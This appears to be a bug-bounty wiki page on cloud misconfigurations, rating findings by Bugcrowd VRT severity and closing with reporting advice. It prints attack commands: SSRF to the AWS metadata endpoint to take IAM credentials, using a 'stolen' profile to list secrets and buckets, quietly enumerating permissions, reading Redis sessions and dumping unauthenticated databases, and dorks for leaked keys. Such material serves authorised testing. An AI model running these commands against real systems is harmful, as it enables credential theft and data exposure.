# Cloud Security

← [[VRT-Overview]]

---

Cloud misconfigurations are now one of the most common sources of critical findings. When a company runs on AWS/GCP/Azure, a single misconfiguration can expose the entire infrastructure — not just one app.

---

## VRT Severity Reference

| Category | Vulnerability | P-Rating |
|---------|--------------|---------|
| IAM Misconfigurations | Publicly Accessible IAM Credentials | P1 |
| IAM Misconfigurations | Overly Permissive IAM Roles | P2 |
| Storage Misconfigurations | Unencrypted Sensitive Data at Rest | P2 |
| Network Configuration | Lack of Network Segmentation | P3 |
| Network Configuration | Open Management Ports to the Internet | P3 |
| Misconfigured Services/APIs | Insecure API Endpoints | P4 |
| Misconfigured Services/APIs | Exposed Debug / Admin Interfaces | Varies |
| Storage Misconfigurations | Publicly Accessible Cloud Storage | Varies |
| Logging and Monitoring | Disabled or Insufficient Logging | P5 |

---

## IAM Misconfigurations

IAM (Identity and Access Management) controls who can do what in the cloud account. Misconfigurations here are critical.

### Publicly Accessible IAM Credentials (P1)

The highest-impact cloud finding. IAM credentials exposed publicly = attacker has full access to cloud infrastructure.

**Where they appear:**
- GitHub repos (accidentally committed `.env`, `config.json`, `credentials`)
- S3 buckets (config files publicly readable)
- SSRF to metadata endpoint (most common path)
- JS source code or API responses
- Docker images pushed to public registries

```bash
# Via SSRF → AWS metadata endpoint
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response contains:
{
  "AccessKeyId": "ASIAXXX...",
  "SecretAccessKey": "abc123...",
  "Token": "FwoGZXI..."
}

# With these credentials:
aws sts get-caller-identity --profile stolen
aws s3 ls --profile stolen
aws secretsmanager list-secrets --profile stolen
aws ec2 describe-instances --profile stolen
```

**Validating the credentials:**
```bash
# First, always check what the key can do
aws sts get-caller-identity

# Enumerate permissions without triggering alarms
# (read-only operations are safer)
aws iam list-attached-user-policies --user-name [username]
aws iam simulate-principal-policy ...
```

### Overly Permissive IAM Roles (P2)

A role that has `*:*` or broad permissions when it only needs specific ones. 

**Testing:** Use `PMapper` or `Cloudsplaining` to map IAM permissions and identify privilege escalation paths.

---

## Storage Misconfigurations

### Publicly Accessible S3 Buckets (Varies)

An S3 bucket configured for public read exposes everything in it. Impact depends entirely on what's stored.

**Finding buckets:**
```bash
# Common naming patterns
company-name.s3.amazonaws.com
s3.amazonaws.com/company-name
company-backup.s3.amazonaws.com
company-assets.s3.amazonaws.com
company-prod-data.s3.amazonaws.com

# Test if readable without credentials
aws s3 ls s3://bucket-name --no-sign-request
curl https://bucket-name.s3.amazonaws.com/

# If listable, look for:
# - Database backups (.sql, .dump)
# - Config files (.env, config.json)
# - PII exports (.csv, .json)
# - Source code (.zip, .tar.gz)
# - Private keys (.pem, id_rsa)
```

**Severity:**
- Public bucket with PII/credentials = P1/P2
- Public bucket with internal configs = P2/P3
- Public bucket with public assets only = P5 (probably intentional)

---

## Exposed Cloud Services

When cloud services are accessible from the internet without authentication:

### Elasticsearch (Port 9200)

```bash
# Check if accessible
curl http://target-ip:9200/
# No auth required → full database access

# List indices
curl http://target-ip:9200/_cat/indices

# Read data
curl http://target-ip:9200/users/_search?size=100
```

### Redis (Port 6379)

```bash
redis-cli -h target-ip
> INFO       ← basic info, no auth required = misconfigured
> KEYS *     ← list all keys
> GET session:abc123   ← steal sessions
```

### MongoDB (Port 27017)

```bash
mongosh --host target-ip --port 27017
> show dbs
> use myapp
> db.users.find().limit(10)
```

### Kubernetes Dashboard / API

```bash
# Kubernetes API server
curl https://target:6443/api/v1/namespaces/default/pods

# Dashboard often exposed without auth
https://target:8001/
```

---

## Network Misconfigurations

### Open Management Ports (P3)

Ports that should never be internet-facing:
- `22` SSH — should use key auth only, ideally via VPN
- `3389` RDP — massive attack surface, should be behind VPN
- `3306` MySQL — never internet-facing
- `5432` PostgreSQL — never internet-facing
- `27017` MongoDB — never internet-facing
- `6379` Redis — never internet-facing
- `9200` Elasticsearch — never internet-facing
- `2375` Docker daemon — critical RCE if exposed

```bash
# Quick check via Shodan
shodan search "port:27017 org:TargetCorp"
shodan search "port:6379 org:TargetCorp has_screenshot:false"

# Nmap scan on discovered IPs
nmap -sV -p 3306,5432,6379,9200,27017 target-ip
```

---

## Cloud-Specific Recon

```bash
# Find S3 buckets related to target
# Pattern: company-name variations
gobuster s3 -w /path/to/subdomains.txt

# GrayhatWarfare — search exposed buckets
https://buckets.grayhatwarfare.com/

# AWS credentials in GitHub
"amazonaws.com" "AccessKeyId" site:github.com
"AKIA" site:github.com filename:.env

# CloudSploit — automated cloud security scanning (if you have credentials)
cloudsploit scan --config config.js

# ScoutSuite — multi-cloud security assessment
scout aws --profile stolen-profile
```

---

## Reporting Cloud Findings

Cloud findings often have massive impact. When reporting:

1. **Validate carefully** — don't make destructive actions (don't delete anything, don't spin up resources)
2. **Document what you accessed** — list the data types you found, not the actual data
3. **Show the credential source** — where did you find/reach the credentials?
4. **Show minimal enumeration** — `aws sts get-caller-identity` is enough to prove credential validity without doing more damage
5. **Include the escalation path** — what could a real attacker do with this access?

---

*Related: [[SSRF-Overview]] | [[A05-Security-Misconfiguration]] | [[VRT-Overview]]*

*Sources: Bugcrowd VRT v1.18, Rhino Security Labs AWS research, CloudSploit*
